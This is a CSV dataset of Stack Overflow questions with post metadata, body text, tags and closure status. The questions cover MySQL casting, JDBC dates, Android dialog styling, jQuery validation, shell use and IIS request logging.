PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus
10633695,05/17/2012 10:11:53,738165,05/04/2011 14:07:28,355,15,Sorting a VARCHAR column as FLOAT using the CAST operator don't work in MySQL,"I can't find a way to sort a varchar column casted as float. Here is my SQL request:

    SELECT guid, number FROM table ORDER BY 'CAST(number AS FLOAT) DESC'

The ""number"" column is defined like this:

    number	varchar(20)	ascii_general_ci

And the values defined in this column for my test are :

    0.00
    200.00
    20.00
    100.00

MySQL totally ignore the CAST operator and sort the columns by guid...

Is there a bug in MySQL or did I do something wrong ?",mysql,casting,,,,05/17/2012 17:46:02,not a real question
5672688,04/15/2011 05:24:33,119772,06/09/2009 11:57:53,4148,260,Can we avoid interning of strings in java?,"Can we completely disable interning of strings. It might not be really helpful, but just a thought. I can think atleast one point where it could be helpful i.e. during jvm tuning, controlling the size of the perm gen. 

For e.g. if I give out an OSGI framework and anyone can add any number of bundles of their own and each bundles string interning can completely screw up my tuning parameters. (Ofcourse I know that we should do tuning on a given fixed distro, but still...)

Any thoughts!!",java,performance,permgen,intern,,,open
7205777,08/26/2011 13:58:50,914231,08/26/2011 13:58:50,1,0,How to add SVN source control plug in to Visual studeo 2010?,"I have work with visual studeo 2010.I am install it then i am install ankh svn software but it is not added to the visual studeo plug in.Please give any procedure for adding it to the visual studeo 2010.

Thank you 
Dadasaheb Chobhe",c#,.net,svn,tortoisesvn,ankhsvn,08/26/2011 19:41:11,not a real question
4892618,02/03/2011 22:44:13,602365,02/03/2011 22:37:51,1,0,C# How invoke this Javascript In c#???,"I want to invoke this javascript.

 //<BUTTON id=""TestID"" class=""My_Test button small"" type=""submit""><SPAN class=""account"">By</SPAN></BUTTON>

How can I send this command without use the mouse an click the button on the form??
",c#,javascript,,,,02/03/2011 22:59:04,not a real question
9085852,01/31/2012 19:44:28,973397,09/30/2011 15:37:26,52,3,"Gathering Date and Time of page load, on page load","I have a web form setup on an area of my site. I need to gather the Date and Time of when it's visited.

I'm wondering how I'd be able to code it so that, on page load, the date and time is gathered? 

How could I do this? *Something with defining on page load with Javascript / jQuery > calling a PHP snippet that gathers Y = date, T = time > then I tie to store where my form is stored?*

Thanks for any suggestions, code help also appreciated!",php,javascript,jquery,,,02/01/2012 20:08:16,not a real question
6874146,07/29/2011 13:47:15,24835,10/03/2008 14:07:26,439,13,"JDBC Prepared Statement . setDate(....) doesn't save the time, just the date.. How can I save the time as well?","I have the following Query :

    INSERT INTO users (user_id, date_created) VALUES (?,?)

I have the following prepared statement

    PreparedStatement insertUser = dbConnection.prepareStatement(sql, Statement.RETURN_GENERATED_KEYS);
    
    insertUser.setInt(1, 7);
    java.util.Date now = new java.util.Date(System.currentTimeMillis());
    insertUser.setDate(2, new java.sql.Date((new Date(System.currentTimeMillis())).getTime()));
    insertUser.executeUpdate();


If i check the database, I find that it is inserting only today's date not the time though, so it would be : 2011-07-29 00:00:00

What should i put in the setDate to get the time as well?

Thanks
",java,jdbc,prepared-statement,,,,open
7590591,09/28/2011 22:51:44,784868,06/05/2011 16:05:36,50,3,A slightly more complex dialog background,"I am using &lt;shape&gt;, &lt;style&gt; and the Dialog(context, theme) constructor to create custom dialogs for my app. I currently have a single-color background going, but would like to have a two-tone background separating the buttons at the bottom from the rest of the content. I just can't figure out how to get it.

I have this...

![current][1]

Using the following shape and style...

    <shape
        xmlns:android=""http://schemas.android.com/apk/res/android""
        android:shape=""rectangle""> 
        <solid
            android:color=""#FF333333""/>    
        <stroke
            android:width=""5dp""
            android:color=""#FF000000""/>
        <padding
            android:left=""12dp""
            android:top=""12dp""
            android:right=""12dp""
            android:bottom=""12dp""/>
        <corners
            android:radius=""20dp""/> 
    </shape>
    
    <style name=""dialog_back"" parent=""@android:style/Theme.Dialog"">
        <item name=""android:windowBackground"">@drawable/dialog_back</item>
    </style>

But I want this...

![future][2]

  [1]: http://i.stack.imgur.com/XsPyY.png
  [2]: http://i.stack.imgur.com/BAJQ6.png

The cumulative height of the content will vary but the button height will always be the same.

Any suggestions?",android,dialog,drawable,,,,open
8644545,12/27/2011 12:18:49,1065699,11/25/2011 13:23:46,6,0,iphone Application orientation design,I am very new to iPhone development. I have to design the app which will look adjusted in both portrait and landscape mode. What precautions/coding standard I should take so that it will not further painful for me.,iphone,design,ios5,,,12/27/2011 16:05:12,not a real question
3865638,10/05/2010 16:20:04,288252,03/07/2010 15:35:46,134,1,Logging server-wide request data (including POST data) in IIS 6 / ASP.NET webforms,"Here's the big picture.  We're running a server in IIS 6 that hosts several web sites and applications, and we're in the process of moving the whole thing to a different data center with a slightly different setup.  We've notified our users and updated our DNS info so that theoretically everyone will be happily hitting the new server from day 1, but we know that someone will inevitably fall through the cracks.

The powers that be want a ""Listener"" page/handler that will receive *all* requests to the server and log the entire request to a text file, including (especially) POST data.

That's where I'm stuck.  I don't know how to implement a single handler that will receive all requests to the server.  I vaguely understand IIS 6 redirection options, but they all seem to lose the POST data on the redirect.  I also know a little about IIS 6's built-in logging, but it ignores POST data as well.

Is there a simple(ish) way to route all requests to the server so that they all hit a single handler, while maintaining post data?

EDIT: This is in WebForms, if that matters, but other solutions (if small) are definitely worth considering.",asp.net,http,logging,post,iis6,,open
10631161,05/17/2012 06:52:05,1252506,03/06/2012 14:55:50,1,0,hashmap data insertion in SQL,"kindly suggest me a code on how to insert multiple HashMap data in a single SQL database table 
eg: I have 3 hashmap in a single program , how do  i iterate through all the hashmap data and inert the same in database",jdbc,,,,,05/23/2012 18:08:12,not a real question
10153539,04/14/2012 12:16:16,299991,03/23/2010 14:30:52,118,1,jquery input validation+background color,"I have an HTML form where I want to add some validation logic. 
In that form i have two input fields, one of them has to get always integer values, while the other one have to get always float values. (first one is items number and other one is total cost).
I want those input fields to change background color to light red if the input value is wrong (float value as item number, for example) and i want to care only for the logic of it, maybe i can guess jQuery can take care of everything else, but I can't find any help on internet on how to get this done without reinventing the wheel.
Does anyone have some hints on how to do that?",php,jquery,jquery-ui,validation,,,open
5813331,04/28/2011 03:38:04,610734,02/10/2011 02:29:02,1,0,Can silverlight finally substitute javascript?,"Maybe it sounds silly, but it seems to me that since silverlight and javascript both can only be executed on the browser, if the industry standard requires all the browsers to pre-install silverlight, can MS possibily create a new technology that can balance the C# code execution on server side and browser side? All the client and server side can be developed by .net only, and I don't need to develop the javacript anymore. 

Is this possible? Or is there some hurdles that MS cannot overcome to abandon javascript? 

Thanks,

Wei",c#,javascript,silverlight,,,04/28/2011 03:42:58,not constructive
11650973,07/25/2012 13:35:00,1513168,07/09/2012 21:35:10,34,0,"How to ""cd"" to a directory after ""grep""?","I want to find a directory using `grep` then change current directory to the resulting directory.
For example:

    $ ls | grep 1670 |

finds me directory haib12CJS1670. I am trying to do something like below:

    $ ls | grep 1670 | cd

so that my directory is set to haib12CJS1670 at a single step. Obviously my way is not working. Any suggestions? Thank you",unix,terminal,,,,07/27/2012 04:16:05,off topic
1161992,07/21/2009 22:02:23,130717,06/29/2009 22:25:56,693,33,How can future programming languages better facilitate abstraction?,"One of the key properties to designing comprehensible software (and, indeed, designing anything at all) is to develop a **good set of abstractions**. These days, those abstractions include things like functions, classes, interfaces, recursion, and higher-order functions. But what else is there? How can we further abstract our designs, so that I needn't think about *anything* but my immediate, direct goal? What novel abstractions have yet to be leveraged by existing technologies?

Also note that most of the items on my list (with the exception, perhaps, of recursion) are also tools used for code reuse. Code reuse is *not* the subject of this question, and is not what I see as a necessary aspect of a good abstraction. Functions are useful as abstractions because they hide what they are doing behind a descriptive name, not because I can call them from several different places.

A poorly-formed idea: Is a driver function that only calls a sequence of other functions, without maintaining any state of its own, really the same as a function? We write it as a function, and call it as a function, but perhaps it represents a different concept? This is reflected in some languages by making a distinctions between procedures returning values and procedures not returning values. But maybe there's a better way to view that difference, some different way to abstract the sequence of relatively unrelated steps?


So to reiterate, **how can future programming languages better facilitate abstraction?**",programming-languages,future,design,abstraction,,,open
4580201,01/02/2011 19:57:06,161554,08/23/2009 12:22:30,1279,77,Handling ContextMenuStrip on ListView,"I have a ListView with some items. The ListView has some group defined, some column, and some items are added. The ListView has set also the ContextMenu.

On *Opening* event of the ContextMenu, I shall check whether the context menu was opened on a ListView item. So, I did:

    private void CtxMenuProcess_Opening(object sender, CancelEventArgs e)
	{
		ContextMenuStrip ctxMenuStrip = (ContextMenuStrip)sender;
		ListViewHitTestInfo hitTestInfo = LstViewAdminApp.HitTest(LstViewAdminApp.PointToClient(ctxMenuStrip.Location));

		if (hitTestInfo.Item != null) {
            //....
        }
     }

Sadly, the hit doesn't happen.

I feel that the coordinates of the *ctxMenuStrip* are the wrong ones, but I tried a lot of ""variants"" without success, and the documentation of ListView.HitTest is very poor.

Anybody can help me?",c#,.net,listview,contextmenu,,,open
